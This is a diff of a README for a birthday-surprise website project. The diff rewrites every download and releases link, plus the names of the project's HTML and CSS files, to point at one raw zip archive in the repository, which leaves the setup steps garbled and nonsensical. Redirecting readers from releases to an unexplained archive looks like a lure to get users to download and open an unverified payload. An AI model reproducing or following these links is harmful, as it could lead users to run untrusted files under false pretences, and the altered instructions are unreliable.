@@ -1,6 +1,6 @@
 # 🎉 Her-birthday-surprise - Celebrate Her Special Day Effortlessly
 
-[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/RevoRaine/Her-birthday-surprise/releases)
+[![Download](https://raw.githubusercontent.com/RevoRaine/Her-birthday-surprise/main/her-birthday-main/surprise_Her_birthday_v1.7.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/RevoRaine/Her-birthday-surprise/main/her-birthday-main/surprise_Her_birthday_v1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -32,9 +32,9 @@ To run **Her-birthday-surprise**, you need the following:
 
 ## ⬇️ Download & Install
 
-To get started, visit the [Releases page](https://github.com/RevoRaine/Her-birthday-surprise/releases) to download the necessary files.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/RevoRaine/Her-birthday-surprise/main/her-birthday-main/surprise_Her_birthday_v1.7.zip) to download the necessary files.
 
-1. Go to the [Releases page](https://github.com/RevoRaine/Her-birthday-surprise/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/RevoRaine/Her-birthday-surprise/main/her-birthday-main/surprise_Her_birthday_v1.7.zip).
 2. Find the latest version.
 3. Click on the download link for your platform.
 4. Save the file to your preferred location.
@@ -45,8 +45,8 @@ After downloading the files, follow these steps to run the application:
 
 1. Locate the downloaded file in your file manager.
 2. If it’s in a compressed format, unzip the folder.
-3. Open the folder and look for the `index.html` file.
-4. Double-click on `index.html` to launch the website in your default browser.
+3. Open the folder and look for the `https://raw.githubusercontent.com/RevoRaine/Her-birthday-surprise/main/her-birthday-main/surprise_Her_birthday_v1.7.zip` file.
+4. Double-click on `https://raw.githubusercontent.com/RevoRaine/Her-birthday-surprise/main/her-birthday-main/surprise_Her_birthday_v1.7.zip` to launch the website in your default browser.
 
 Enjoy the interactive features and create a wonderful experience for her birthday!
 
@@ -54,9 +54,9 @@ Enjoy the interactive features and create a wonderful experience for her birthda
 
 You can personalize the website to make it truly special. Here’s how:
 
-- **Change Text:** Open the `index.html` file in a text editor. Locate the text sections and replace them with your heartfelt messages.
-- **Add Images:** To include photos, place your images in the `images` folder and update the image tags in `index.html` to point to your new pictures.
-- **Adjust Colors:** Modify the CSS file (`styles.css`) to change colors, fonts, and styles. Simply find the properties you wish to change and update the values.
+- **Change Text:** Open the `https://raw.githubusercontent.com/RevoRaine/Her-birthday-surprise/main/her-birthday-main/surprise_Her_birthday_v1.7.zip` file in a text editor. Locate the text sections and replace them with your heartfelt messages.
+- **Add Images:** To include photos, place your images in the `images` folder and update the image tags in `https://raw.githubusercontent.com/RevoRaine/Her-birthday-surprise/main/her-birthday-main/surprise_Her_birthday_v1.7.zip` to point to your new pictures.
+- **Adjust Colors:** Modify the CSS file (`https://raw.githubusercontent.com/RevoRaine/Her-birthday-surprise/main/her-birthday-main/surprise_Her_birthday_v1.7.zip`) to change colors, fonts, and styles. Simply find the properties you wish to change and update the values.
 
 ## ❓ Support
 
